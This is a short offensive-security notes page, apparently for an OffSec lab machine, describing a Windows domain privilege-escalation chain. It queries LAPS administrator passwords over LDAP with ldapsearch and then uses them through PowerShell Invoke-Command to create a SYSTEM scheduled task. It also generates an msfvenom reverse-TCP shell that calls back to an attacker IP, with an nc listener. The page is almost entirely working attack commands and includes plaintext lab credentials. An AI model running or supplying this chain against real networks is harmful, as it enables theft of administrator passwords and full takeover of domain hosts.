---
description: >-
  Sometimes, you can query LAPS password via ldapsearch. You could use the
  password to create a task scheduler to escalate
---

# LAPS password

### Enumerate

{% code overflow="wrap" %}
```bash
Kali> ldapsearch -H ldap://$RHOST -x -D fmcsorley@HUTCH.OFFSEC -w CrabSharkJellyfish192 -b "DC=hutch,DC=offsec" "(ms-MCS-AdmPwd=*)" ms-MCS-AdmPwd

# WinEPAS or AdPEAS may capture the LAPS password as well. 
```
{% endcode %}

### Create a tasklist.&#x20;

{% code overflow="wrap" %}
```bash
PS> $pw = ConvertTo-SecureString "iF1n(Q5m2Fv9u3" -AsPlainText -Force
PS> $creds = New-Object System.Management.Automation.PSCredential ("Administrator", $pw)
PS> Invoke-Command -Computer hutchdc -ScriptBlock { schtasks /create /sc onstart /tn shell /tr C:\inetpub\wwwroot\shell.exe /ru SYSTEM } -Credential $creds
```
{% endcode %}

### Execution

{% code overflow="wrap" %}
```bash
Kali> msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.142.155 LPORT=53 -f exe -o shell.exe
Kali> rlwrap nc -nlvp 53

PS> Invoke-Command -Computer hutchdc -ScriptBlock { schtasks /run /tn shell } -Credential $creds
```
{% endcode %}
